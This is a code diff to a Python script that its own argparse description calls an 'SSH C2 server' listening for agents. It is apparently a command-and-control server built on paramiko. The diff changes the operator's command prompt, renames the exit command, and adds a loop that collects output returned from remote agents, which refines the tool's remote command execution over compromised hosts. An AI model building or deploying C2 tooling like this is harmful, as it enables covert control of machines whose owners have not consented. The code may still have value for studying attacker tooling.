@@ -3,6 +3,7 @@ import paramiko
 import os
 import socket
 import argparse
+import time
 
 parser = argparse.ArgumentParser(description="SSH C2 server configuration to listen for agents")
 parser._action_groups.pop()
@@ -63,24 +64,31 @@ def main():
     def comm_handler():
         while True:
             try:
-                cmd_line = (f">> {user}@{host} ~$ ")
+                cmd_line = (f"|-- {user}@{host} \n|>> ")
                 command = input(cmd_line + "")
                 head = command.split(" ")[0]
                 match head:
                     case "":
                         comm_handler()
-                    case "exit":
+                    case "!exit":
                         conn.send(command)
                         sys.exit()
                     case _:
                         conn.send(command)
-                        print(conn.recv(102400).decode())
+                        incoming()
             except Exception as ex:
                 print(str(ex))
                 pass
             except KeyboardInterrupt:
                 conn.send("exit")
                 sys.exit()
+    
+    def incoming():
+        time.sleep(1)
+        while conn.recv_ready():
+            print(conn.recv(4096).decode())
+        comm_handler()
+
     comm_handler()
 
 if __name__ == "__main__":
